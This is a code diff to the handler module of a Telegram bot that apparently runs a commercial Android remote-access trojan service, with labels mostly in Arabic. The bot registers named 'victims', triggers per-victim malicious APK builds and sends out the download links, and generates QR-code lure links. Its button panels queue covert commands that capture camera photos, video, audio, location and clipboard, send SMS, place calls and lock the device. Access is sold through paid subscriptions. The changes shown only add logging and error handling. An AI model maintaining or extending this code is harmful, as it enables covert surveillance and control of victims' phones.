@@ -20,7 +20,6 @@ from config import (
 from utils import trigger_victim_apk_build, get_victim_apk_url
 
 from imports_manager import (
-    # Payment / Admin
     get_or_create_user, can_use_tool, consume_usage,
     build_plans_keyboard, build_main_payment_keyboard,
     build_account_text, build_plans_text, send_invoice,
@@ -30,16 +29,18 @@ from imports_manager import (
     build_admin_menu, build_admin_users_keyboard,
     build_user_detail_keyboard, build_user_info_text,
     build_admin_stats_text,
-    # Victims
     create_victim, get_victim, get_all_victims, delete_victim,
     update_victim_status, rename_victim,
     queue_victim_command,
-    # LSH
     lsh_push_command,
-    # QR / RAT
     generate_qr_code_bytes, lsh_generate_qr,
     queue_command,
 )
+
+from logging_config import get_logger
+from monitoring import metrics
+
+logger = get_logger("bot_handlers")
 
 
 # ============================================================
@@ -80,22 +81,16 @@ def main_menu(user_id=None):
 
 def victim_commands_panel(victim_id):
     m = InlineKeyboardMarkup()
-
-    # الكاميرا
     m.row(
         InlineKeyboardButton("📷 أمامية", callback_data=f"vcmd_camfront_{victim_id}"),
         InlineKeyboardButton("📸 خلفية", callback_data=f"vcmd_camback_{victim_id}"),
     )
     m.row(InlineKeyboardButton("🎥 فيديو 10s", callback_data=f"vcmd_video_{victim_id}"))
-
-    # الصوت
     m.row(InlineKeyboardButton("🎙️ صوت 10s", callback_data=f"vcmd_audio_{victim_id}"))
     m.row(
         InlineKeyboardButton("🔔 نغمة", callback_data=f"vcmd_sound_{victim_id}"),
         InlineKeyboardButton("🚨 إنذار", callback_data=f"vcmd_alarm_{victim_id}"),
     )
-
-    # البيانات
     m.row(
         InlineKeyboardButton("📱 معلومات", callback_data=f"vcmd_info_{victim_id}"),
         InlineKeyboardButton("🔋 بطارية", callback_data=f"vcmd_battery_{victim_id}"),
@@ -113,8 +108,6 @@ def victim_commands_panel(victim_id):
         InlineKeyboardButton("📍 الموقع", callback_data=f"vcmd_location_{victim_id}"),
     )
     m.row(InlineKeyboardButton("📋 الحافظة", callback_data=f"vcmd_clipboard_{victim_id}"))
-
-    # التحكم
     m.row(
         InlineKeyboardButton("📳 اهتزاز", callback_data=f"vcmd_vibrate_{victim_id}"),
         InlineKeyboardButton("🔊 صوت أقصى", callback_data=f"vcmd_volmax_{victim_id}"),
@@ -127,22 +120,17 @@ def victim_commands_panel(victim_id):
         InlineKeyboardButton("🔒 قفل", callback_data=f"vcmd_lock_{victim_id}"),
         InlineKeyboardButton("🏠 الرئيسية", callback_data=f"vcmd_home_{victim_id}"),
     )
-
-    # إرسال
     m.row(
         InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"vcmd_sendsms_{victim_id}"),
         InlineKeyboardButton("📞 مكالمة", callback_data=f"vcmd_call_{victim_id}"),
     )
     m.row(InlineKeyboardButton("🌐 فتح رابط", callback_data=f"vcmd_url_{victim_id}"))
-
-    # إدارة
     m.row(
         InlineKeyboardButton("🔄 تحديث", callback_data=f"v_refresh_{victim_id}"),
         InlineKeyboardButton("✏️ تغيير الاسم", callback_data=f"v_rename_{victim_id}"),
     )
     m.row(InlineKeyboardButton("🗑️ حذف الضحية", callback_data=f"v_delete_{victim_id}"))
     m.row(InlineKeyboardButton("🔙 رجوع للضحايا", callback_data="v_list"))
-
     return m
 
 
@@ -166,9 +154,18 @@ def _deny_message(reason, user_id, tool, data=None):
 # ============================================================
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
-    print(f"[+] /start from {message.from_user.id}")
+    logger.info(f"/start from {message.from_user.id}")
+    metrics.inc_counter("bot_commands", tags={"cmd": "start"})
+
     user_name = message.from_user.first_name
-    get_or_create_user(message.from_user.id, message.from_user.username or "Unknown", user_name)
+    try:
+        get_or_create_user(
+            message.from_user.id,
+            message.from_user.username or "Unknown",
+            user_name
+        )
+    except Exception as e:
+        logger.exception(f"get_or_create_user error: {e}")
 
     if is_admin(message.from_user.id):
         text = (
@@ -184,8 +181,11 @@ def start_command(message):
             f"📱 اضغط <b>إدارة الضحايا</b> للبدء"
         )
 
-    bot.send_message(message.chat.id, text, parse_mode="HTML",
-                     reply_markup=main_menu(message.from_user.id))
+    bot.send_message(
+        message.chat.id, text,
+        parse_mode="HTML",
+        reply_markup=main_menu(message.from_user.id)
+    )
 
 
 # ============================================================
@@ -197,12 +197,21 @@ def callback_handler(call):
     user_id = call.from_user.id
     data = call.data
 
+    try:
+        _handle_callback(call, chat_id, user_id, data)
+    except Exception as e:
+        logger.exception(f"callback_handler error: {e}")
+        metrics.inc_counter("bot_errors", tags={"type": "callback"})
+
+
+def _handle_callback(call, chat_id, user_id, data):
+    """المنطق الفعلي للـ callback (مفصول عشان error handling)"""
+
     # ============================================================
     # قائمة الضحايا
     # ============================================================
     if data == "v_list":
         bot.answer_callback_query(call.id)
-
         victims = get_all_victims(chat_id)
 
         m = InlineKeyboardMarkup()
@@ -242,20 +251,18 @@ def callback_handler(call):
     # ============================================================
     if data == "v_new":
         bot.answer_callback_query(call.id)
-
         check = can_use_tool(chat_id, "apk")
         if not check["allowed"]:
             bot.send_message(chat_id, "❌ لا يوجد رصيد. اشترك أولاً.",
                              reply_markup=build_main_payment_keyboard())
             return
-
         consume_usage(chat_id, "apk")
 
         msg = bot.send_message(
             chat_id,
             "📝 <b>إضافة ضحية جديدة</b>\n"
             "━━━━━━━━━━━━━━━━━━\n\n"
-            "أرسل اسم الضحية (مثلاً: <code>أحمد</code> أو <code>محمد - الرياض</code>)\n\n"
+            "أرسل اسم الضحية (مثلاً: <code>أحمد</code>)\n\n"
             "⏱️ <i>لديك 60 ثانية</i>",
             parse_mode="HTML"
         )
@@ -359,7 +366,7 @@ def callback_handler(call):
                 bot.answer_callback_query(call.id, "✅ تم الإرسال")
             else:
                 bot.answer_callback_query(call.id, "❌ فشل الإرسال", show_alert=True)
-            print(f"[+] Command: {action} → {victim_id[:8]}")
+            logger.info(f"Command: {action} → {victim_id[:8]}")
             return
 
         if action == "toast":
@@ -558,8 +565,8 @@ def callback_handler(call):
         bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
         try:
             bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
-        except Exception:
-            pass
+        except Exception as e:
+            logger.warning(f"notify vip user error: {e}")
         return
 
     if data.startswith("admin_remove_vip_"):
@@ -620,9 +627,10 @@ def callback_handler(call):
                 bot.send_message(uid,
                     f"🎉 <b>تم تفعيل اشتراكك!</b>\n📅 ينتهي: <code>{expires.strftime('%Y-%m-%d')}</code>",
                     parse_mode="HTML")
-            except Exception:
-                pass
+            except Exception as e:
+                logger.warning(f"notify user subscription error: {e}")
         except Exception as e:
+            logger.exception(f"activate_subscription error: {e}")
             bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
         return
 
@@ -776,8 +784,8 @@ def callback_handler(call):
         if redis_client:
             try:
                 redis_client.setex(f"qr_token:{token}", 300, chat_id)
-            except Exception:
-                pass
+            except Exception as e:
+                logger.warning(f"redis setex qr_token error: {e}")
         target_link = f"{PUBLIC_URL}/qr_scan_target?token={token}"
         qr_image = generate_qr_code_bytes(target_link)
         if qr_image:
@@ -804,13 +812,13 @@ def callback_handler(call):
         if redis_client:
             try:
                 redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
-            except Exception:
-                pass
+            except Exception as e:
+                logger.warning(f"redis setex lsh_session error: {e}")
         try:
             requests.post(f"{PUBLIC_URL}/lsh_create",
                           json={"chat_id": chat_id, "session_id": session_id}, timeout=5)
-        except Exception:
-            pass
+        except Exception as e:
+            logger.warning(f"lsh_create POST error: {e}")
         target_link = f"{PUBLIC_URL}/lsh?s={session_id}&id={chat_id}"
         qr_image = lsh_generate_qr(target_link)
         if qr_image:
@@ -896,9 +904,7 @@ def callback_handler(call):
         target_chat_id = data.replace("rat_mic_", "")
         queue_command(target_chat_id, "audio")
         bot.answer_callback_query(call.id, "⏳ جاري التسجيل...")
-        return
-
-    # ============================================================
+        return    # ============================================================
     # LSH أوامر
     # ============================================================
     if data.startswith("lsh_snap_"):
@@ -949,6 +955,12 @@ def callback_handler(call):
         bot.answer_callback_query(call.id, "❌", show_alert=not ok)
         return
 
+    # ============================================================
+    # Unknown callback
+    # ============================================================
+    logger.warning(f"Unhandled callback: {data}")
+    bot.answer_callback_query(call.id)
+
 
 # ============================================================
 # Step Handlers
@@ -980,14 +992,14 @@ def victim_name_step(message):
                 "❌ فشل إنشاء الضحية",
                 chat_id=chat_id, message_id=wait_msg.message_id
             )
-        except Exception:
-            pass
+        except Exception as e:
+            logger.warning(f"edit_message_text error: {e}")
         return
 
     victim_token = victim.get("victim_token")
     victim_id = victim.get("victim_id")
 
-    print(f"[+] Victim created: {victim_name} | {victim_id} | token={victim_token[:16]}")
+    logger.info(f"Victim created: {victim_name} | {victim_id} | token={victim_token[:16]}")
 
     def build_and_send():
         if not GITHUB_TOKEN:
@@ -999,8 +1011,8 @@ def victim_name_step(message):
                     chat_id=chat_id, message_id=wait_msg.message_id,
                     parse_mode="HTML"
                 )
-            except Exception:
-                pass
+            except Exception as e:
+                logger.warning(f"edit_message_text error: {e}")
             return
 
         success = trigger_victim_apk_build(victim_token, victim_name)
@@ -1013,8 +1025,8 @@ def victim_name_step(message):
                     chat_id=chat_id, message_id=wait_msg.message_id,
                     parse_mode="HTML"
                 )
-            except Exception:
-                pass
+            except Exception as e:
+                logger.warning(f"edit_message_text error: {e}")
             return
 
         apk_url = get_victim_apk_url(victim_token, max_wait=900)
@@ -1030,8 +1042,8 @@ def victim_name_step(message):
                     parse_mode="HTML",
                     disable_web_page_preview=True
                 )
-            except Exception:
-                pass
+            except Exception as e:
+                logger.warning(f"edit_message_text error: {e}")
             return
 
         try:
@@ -1061,7 +1073,7 @@ def victim_name_step(message):
                     ),
                     parse_mode="HTML"
                 )
-                print(f"[+] APK sent: {victim_name}")
+                logger.info(f"APK sent: {victim_name}")
             else:
                 bot.send_message(
                     chat_id,
@@ -1070,6 +1082,7 @@ def victim_name_step(message):
                     parse_mode="HTML"
                 )
         except Exception as e:
+            logger.exception(f"APK download error: {e}")
             bot.send_message(chat_id, f"❌ خطأ التحميل: {h(str(e))}", parse_mode="HTML")
 
     threading.Thread(target=build_and_send, daemon=True).start()
@@ -1134,8 +1147,8 @@ def victim_name_handler(message):
     if redis_client:
         try:
             redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
-        except Exception:
-            pass
+        except Exception as e:
+            logger.warning(f"redis setex pending_victim_name error: {e}")
 
     markup = InlineKeyboardMarkup()
     markup.row(
@@ -1201,15 +1214,16 @@ def admin_broadcast_handler(message):
             bot.send_message(uid, f"📢 <b>رسالة من الإدارة:</b>\n\n{h(text)}", parse_mode="HTML")
             success += 1
             time.sleep(0.05)
-        except Exception:
+        except Exception as e:
+            logger.warning(f"broadcast to {uid} failed: {e}")
             failed += 1
     try:
         bot.edit_message_text(f"✅ <b>تم!</b>\n✔️ {success}\n❌ {failed}",
                               chat_id=message.chat.id,
                               message_id=status_msg.message_id,
                               parse_mode="HTML")
-    except Exception:
-        pass
+    except Exception as e:
+        logger.warning(f"edit broadcast status error: {e}")
 
 
 def admin_ban_handler(message):
@@ -1254,8 +1268,8 @@ def admin_grant_vip_handler(message):
     bot.send_message(message.chat.id, f"💎 تم منح VIP لـ <code>{uid}</code>", parse_mode="HTML")
     try:
         bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
-    except Exception:
-        pass
+    except Exception as e:
+        logger.warning(f"notify vip user error: {e}")
 
 
 def admin_give_stars_handler(message):
